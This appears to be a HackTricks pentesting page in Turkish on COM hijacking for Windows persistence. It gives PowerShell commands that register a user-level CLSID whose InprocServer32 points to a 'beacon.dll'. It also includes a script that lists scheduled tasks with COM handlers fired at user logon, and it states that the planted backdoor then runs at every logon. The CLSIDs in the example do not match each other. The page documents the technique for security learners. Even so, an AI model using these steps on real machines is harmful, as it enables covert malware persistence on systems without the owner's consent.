# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Olmayan COM bileşenlerini arama

HKCU'nun değerleri kullanıcılar tarafından değiştirilebildiğinden, **COM Hijacking** **kalıcı mekanizmalar** olarak kullanılabilir. `procmon` kullanarak, bir saldırganın kalıcılık sağlamak için oluşturabileceği mevcut olmayan COM kayıtlarını bulmak kolaydır. Filtreler:

- **RegOpenKey** işlemleri.
- _Sonuç_ **NAME NOT FOUND** olduğunda.
- ve _Yol_ **InprocServer32** ile bitiyorsa.

Hangi mevcut olmayan COM'u taklit etmeye karar verdikten sonra, aşağıdaki komutları çalıştırın. _Her birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun, çünkü bu aşırıya kaçabilir._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Ele Geçirilebilir Görev Zamanlayıcı COM bileşenleri

Windows Görevleri, COM nesnelerini çağırmak için Özel Tetikleyiciler kullanır ve Görev Zamanlayıcı aracılığıyla çalıştırıldıkları için, ne zaman tetikleneceklerini tahmin etmek daha kolaydır.

<pre class="language-powershell"><code class="lang-powershell"># COM CLSID'lerini Göster
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Görev Adı: " $Task.TaskName
Write-Host "Görev Yolu: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Örnek Çıktı:
<strong># Görev Adı:  Örnek
</strong># Görev Yolu:  \Microsoft\Windows\Örnek\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [öncekine benzer daha fazla...]</code></pre>

Çıktıyı kontrol ederek, örneğin **her kullanıcı oturum açtığında** çalışacak birini seçebilirsiniz.

Şimdi **HKEY\CLASSES\ROOT\CLSID** içinde ve HKLM ile HKCU'da **{1936ED8A-BD93-3213-E325-F38D112938EF}** CLSID'sini arayarak, genellikle değerin HKCU'da mevcut olmadığını bulursunuz.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
O zaman, HKCU girişini oluşturabilirsiniz ve kullanıcı her oturum açtığında, arka kapınız çalışacaktır.

{{#include ../../banners/hacktricks-training.md}}
